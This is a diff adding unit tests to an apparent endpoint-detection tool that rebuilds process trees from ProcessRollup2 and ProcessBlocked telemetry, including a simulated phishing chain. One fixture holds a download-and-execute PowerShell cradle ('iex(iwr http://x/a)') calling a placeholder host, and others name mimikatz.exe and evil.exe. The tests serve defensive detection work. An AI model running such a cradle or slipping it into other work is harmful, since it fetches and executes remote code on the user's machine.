@@ -1157,6 +1157,8 @@ class TestProcessTree(TestModules):
             _done([_pr2("70", "71", "svchost.exe", T0)]),
             _started("job-probe"),
             _done([]),
+            _started("job-blocked"),
+            _done([]),
         ]
 
         result = self._tree(pivot_process_id="30")
@@ -1164,8 +1166,127 @@ class TestProcessTree(TestModules):
         self.assertIsNone(result["pivot"])
         self.assertEqual(result["ancestry"], [])
         self.assertIsNone(result["delivery_vector"])
-        self.assertTrue(any("7 days" in note for note in result["notes"]))
-        self.assertEqual(len(self._start_calls()), 2)
+        self.assertTrue(
+            any("No ProcessRollup2 or ProcessBlocked" in note for note in result["notes"])
+        )
+        self.assertEqual(
+            [s["purpose"] for s in result["searches"]],
+            ["window", "anchor_probe", "blocked_probe"],
+        )
+
+    def test_blocked_pivot_comes_from_process_blocked(self):
+        # The sensor blocked powershell.exe before it ran: no ProcessRollup2 for "30",
+        # but its parent chain winword.exe <- outlook.exe is in the window.
+        chain = [e for e in PHISHING_CHAIN if e["TargetProcessId"] in ("10", "20")]
+        blocked = _pr2(
+            "30",
+            "20",
+            "powershell.exe",
+            T0 - 1,
+            "powershell -nop -c iex(iwr http://x/a)",
+            ParentBaseFileName="WINWORD.EXE",
+            SignInfoFlags="8683538",
+        )
+        self.mock_client.command.side_effect = [
+            _started("job-window"),
+            _done(chain),
+            _started("job-probe"),
+            _done([]),
+            _started("job-blocked"),
+            _done([blocked]),
+            # outlook.exe's parent "1" is missing from the window.
+            _started("job-parent"),
+            _done([]),
+        ]
+
+        result = self._tree(pivot_process_id="30")
+
+        pivot = result["pivot"]
+        self.assertEqual(pivot["process_id"], "30")
+        self.assertTrue(pivot["blocked"])
+        self.assertEqual(pivot["source_event"], "ProcessBlocked")
+        self.assertEqual(pivot["parent_process_id"], "20")
+        self.assertEqual(pivot["parent_image"], "WINWORD.EXE")
+        self.assertEqual(pivot["command_line"], "powershell -nop -c iex(iwr http://x/a)")
+        self.assertEqual(pivot["signing"], {"sign_info_flags": "8683538"})
+        self.assertEqual([n["process_id"] for n in result["ancestry"]], ["20", "10"])
+        self.assertTrue(all(not n["blocked"] for n in result["ancestry"]))
+        self.assertEqual(result["ancestry"][0]["source_event"], "ProcessRollup2")
+        self.assertEqual(result["descendants"], [])
+        self.assertEqual(result["delivery_vector"]["kind"], "phishing_doc")
+        self.assertFalse(result["window"]["anchor_recovered"])
+        self.assertTrue(any("ProcessBlocked event" in note for note in result["notes"]))
+        self.assertFalse(any("7 days" in note for note in result["notes"]))
+        self.assertEqual(
+            [s["purpose"] for s in result["searches"]],
+            ["window", "anchor_probe", "blocked_probe", "parent_lookup"],
+        )
+
+        blocked_body = self._start_calls()[2].kwargs["body"]
+        self.assertTrue(
+            blocked_body["queryString"].startswith(
+                f'#event_simpleName=ProcessBlocked aid="{AID}" TargetProcessId="30"\n'
+            )
+        )
+        self.assertIn("ParentBaseFileName", blocked_body["queryString"])
+        self.assertIn("limit=1)", blocked_body["queryString"])
+        self.assertEqual(blocked_body["start"], PIVOT_MS - 7 * 24 * 3600 * 1000)
+        self.assertEqual(blocked_body["end"], PIVOT_MS + 600_000)
+
+    def test_blocked_pivot_outside_the_window_recentres_it(self):
+        late = T0 - 3 * 3600
+        blocked = _pr2("30", "20", "mimikatz.exe", late)
+        parent = _pr2("20", "", "cmd.exe", late - 5)
+        self.mock_client.command.side_effect = [
+            _started("job-window"),
+            _done([_pr2("70", "71", "svchost.exe", T0)]),
+            _started("job-probe"),
+            _done([]),
+            _started("job-blocked"),
+            _done([blocked]),
+            _started("job-recentred"),
+            _done([parent]),
+        ]
+
+        result = self._tree(pivot_process_id="30")
+
+        self.assertTrue(result["pivot"]["blocked"])
+        self.assertEqual([n["process_id"] for n in result["ancestry"]], ["20"])
+        self.assertTrue(result["window"]["anchor_recovered"])
+        self.assertEqual(result["window"]["pivot_time"], "2025-01-01T09:00:00Z")
+        self.assertIsNone(result["unresolved_parent_process_id"])
+        self.assertEqual(
+            [s["purpose"] for s in result["searches"]],
+            ["window", "anchor_probe", "blocked_probe", "recentred_window"],
+        )
+        recentred_body = self._start_calls()[3].kwargs["body"]
+        self.assertEqual(recentred_body["start"], int(late * 1000) - 600_000)
+
+    def test_blocked_pivot_without_a_parent_says_so(self):
+        blocked = _pr2("30", None, "evil.exe", T0)
+        self.mock_client.command.side_effect = [
+            _started("job-window"),
+            _done([]),
+            _started("job-probe"),
+            _done([]),
+            _started("job-blocked"),
+            _done([blocked]),
+        ]
+
+        result = self._tree(pivot_process_id="30")
+
+        self.assertTrue(result["pivot"]["blocked"])
+        self.assertIsNone(result["pivot"]["parent_process_id"])
+        self.assertEqual(result["ancestry"], [])
+        self.assertTrue(any("names no parent process" in note for note in result["notes"]))
+        self.assertEqual(len(self._start_calls()), 3)
+
+    def test_no_blocked_probe_when_the_pivot_is_named_by_image(self):
+        # There is no process id to probe for.
+        self.mock_client.command.side_effect = [_started("job"), _done([])]
+        result = self._tree(pivot_image="evil.exe")
+        self.assertIsNone(result["pivot"])
+        self.assertEqual([s["purpose"] for s in result["searches"]], ["window"])
 
     def test_search_count_never_exceeds_the_limit(self):
         orphan = _pr2("30", "20", "rundll32.exe", T0 - 3600)
@@ -1474,6 +1595,15 @@ class TestProcessRollupQuery(unittest.TestCase):
             "CodeSigningFlags])\n"
             "| sort(@timestamp, order=asc, limit=5)",
         )
+
+    def test_process_blocked_query_and_unknown_event_names(self):
+        query = _process_rollup_query(AID, 1, "30", event_name="ProcessBlocked")
+        self.assertTrue(query.startswith(f'#event_simpleName=ProcessBlocked aid="{AID}"'))
+        self.assertIn("CodeSigningFlags, ParentBaseFileName])", query)
+        for event_name in ("ProcessRollup2 | x", "EndOfProcess", "", None):
+            with self.subTest(event_name=event_name):
+                with self.assertRaises(ValueError):
+                    _process_rollup_query(AID, 1, "30", event_name=event_name)
 
     def test_rejects_unsafe_values(self):
         for device_id, limit, pid in [
@@ -1907,6 +2037,9 @@ class TestProcessNodeContract(unittest.TestCase):
                 "signing": {"sign_info_flags": "8683538"},
                 "process_start_time": "2023-11-14T22:13:19.500000Z",
                 "timestamp": "2023-11-14T22:13:20Z",
+                "parent_image": None,
+                "source_event": "ProcessRollup2",
+                "blocked": False,
             },
         )
 
@@ -1919,7 +2052,7 @@ class TestProcessNodeContract(unittest.TestCase):
             {
                 "process_id", "parent_process_id", "os_pid", "image", "command_line",
                 "user_name", "user_sid", "sha256", "signing", "process_start_time",
-                "timestamp",
+                "timestamp", "parent_image", "source_event", "blocked",
             },
         )
         self.assertIsNone(node["parent_process_id"])
